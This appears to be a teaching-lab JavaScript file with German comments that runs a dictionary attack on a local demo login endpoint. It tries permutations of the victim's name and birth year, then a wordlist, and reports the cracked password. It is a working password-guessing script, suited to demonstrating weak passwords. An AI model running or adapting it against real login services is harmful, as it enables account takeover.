// Wörterbuch-Angriff (Stufe 2.2, "mittel").
// Statt alle Kombinationen zu bauen, probieren wir nur Wörter aus einer Liste.
// Das ist meistens schneller, weil Leute oft bekannte/schwache Passwörter nehmen.
//
// Zusätzlich testen wir Permutationen aus PERSÖNLICHEN Daten des Opfers
// (Name, Geburtsjahr, ...). Idee: Viele Menschen bauen ihr Passwort aus Dingen,
// die man über sie kennt - z.B. "Max2010" oder "max!". Kennt der Angreifer diese
// Daten (aus Social Media, Datenlecks, ...), sind solche Passwörter schnell geknackt.

const fs = require("fs"); // eingebautes Modul zum Einlesen von Dateien

const username = "admin";

// bekannte persönliche Daten des Opfers (hier erfunden für die Demo)
const victim = { name: "admin", birthYear: 1999 };

// einen Login-Versuch schicken, true wenn das Passwort stimmt
// async/await, weil wir auf die Antwort vom Server warten müssen
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST", // Daten an den Server senden
    headers: { "Content-Type": "application/json" }, // Daten sind JSON
    body: JSON.stringify({ username, password }), // Objekt in JSON-Text umwandeln
  });
  return response.status === 200; // 200 = Login OK
}

// baut aus den persönlichen Daten ein paar typische Passwort-Varianten (Permutationen)
function personalGuesses(person) {
  const name = person.name;
  const Name = name.charAt(0).toUpperCase() + name.slice(1); // erster Buchstabe gross
  const year = String(person.birthYear);
  return [
    name,            // max
    Name,            // Max
    name + year,     // max1999
    Name + year,     // Max1999
    name + "123",    // max123
    name + "!",      // max!
    year,            // 1999
  ];
}

async function dictionaryAttack() {
  const start = Date.now(); // Startzeit für die Dauer merken

  // ganze Datei als Text einlesen und in einzelne Wörter (eine pro Zeile) aufteilen
  const content = fs.readFileSync("data/dictionary.txt", "utf8");
  const words = content
    .split(/\r?\n/)                     // bei jedem Zeilenumbruch trennen (Windows \r\n und Linux \n)
    .map((word) => word.trim())         // Leerzeichen/Reste am Rand entfernen
    .filter((word) => word.length > 0); // leere Zeilen rauswerfen

  // zuerst die persönlichen Varianten, dann die allgemeine Wortliste probieren
  const candidates = [...personalGuesses(victim), ...words];

  console.log("Probiere", candidates.length, "Kandidaten ...");

  // jeden Kandidaten der Reihe nach als Passwort ausprobieren
  for (const candidate of candidates) {
    const found = await tryLogin(username, candidate);
    if (found) {
      const seconds = (Date.now() - start) / 1000;
      console.log("Passwort gefunden:", candidate);
      console.log("Dauer:", seconds, "Sekunden");
      return; // gefunden -> wir können aufhören
    }
  }

  // Schleife ganz durch, kein Kandidat hat gepasst
  console.log("Kein Passwort gefunden.");
}

dictionaryAttack(); // Angriff starten
